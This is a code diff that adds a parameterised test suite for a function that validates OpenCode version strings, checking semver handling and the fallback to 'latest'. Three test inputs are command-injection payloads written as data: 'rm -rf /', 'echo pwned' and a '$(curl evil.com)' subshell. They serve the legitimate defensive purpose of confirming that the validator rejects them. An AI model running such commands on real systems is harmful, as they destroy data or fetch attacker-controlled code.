@@ -25,6 +25,7 @@ import { sanitizeSecrets } from "../src/log";
 import { queryAnalyticsEngine, emitMetric } from "../src/metrics";
 import { verifyWebhook, createWebhooks } from "../src/github";
 import { GitHubAPIError, MetricsError } from "../src/errors";
+import { validateOpenCodeVersion } from "../github/script/context";
 import type { Env } from "../src/types";
 import type {
   ScheduleEventPayload,
@@ -1173,6 +1174,34 @@ describe("resolvePermissions", () => {
   it("falls back to NO_PUSH for numeric input", () => {
     const NO_PUSH = { contents: "read", issues: "write", pull_requests: "write", metadata: "read" };
     expect(resolvePermissions(42 as any)).toEqual(NO_PUSH);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// OpenCode Version Validation
+// ---------------------------------------------------------------------------
+
+describe("OpenCode Version Validation", () => {
+  it.each([
+    { input: undefined, expected: "latest", label: "undefined" },
+    { input: "", expected: "latest", label: "empty string" },
+    { input: "  ", expected: "latest", label: "whitespace only" },
+    { input: "latest", expected: "latest", label: "latest" },
+    { input: "dev", expected: "dev", label: "dev" },
+    { input: "1.2.16", expected: "1.2.16", label: "basic semver" },
+    { input: "0.1.0", expected: "0.1.0", label: "zero major" },
+    { input: "1.2.16-beta.1", expected: "1.2.16-beta.1", label: "pre-release" },
+    { input: "1.2.16-rc1", expected: "1.2.16-rc1", label: "rc pre-release" },
+    { input: " 1.2.16 ", expected: "1.2.16", label: "trimmed semver" },
+    { input: "not-a-version", expected: "latest", label: "arbitrary string" },
+    { input: "v1.2.16", expected: "latest", label: "v-prefixed (invalid)" },
+    { input: "1.2", expected: "latest", label: "incomplete semver" },
+    { input: "1.2.16.4", expected: "latest", label: "four-part version" },
+    { input: "latest; rm -rf /", expected: "latest", label: "injection attempt" },
+    { input: "1.2.16 && echo pwned", expected: "latest", label: "command injection" },
+    { input: "$(curl evil.com)", expected: "latest", label: "subshell injection" },
+  ])("$label ($input) → $expected", ({ input, expected }) => {
+    expect(validateOpenCodeVersion(input)).toBe(expected);
   });
 });
 
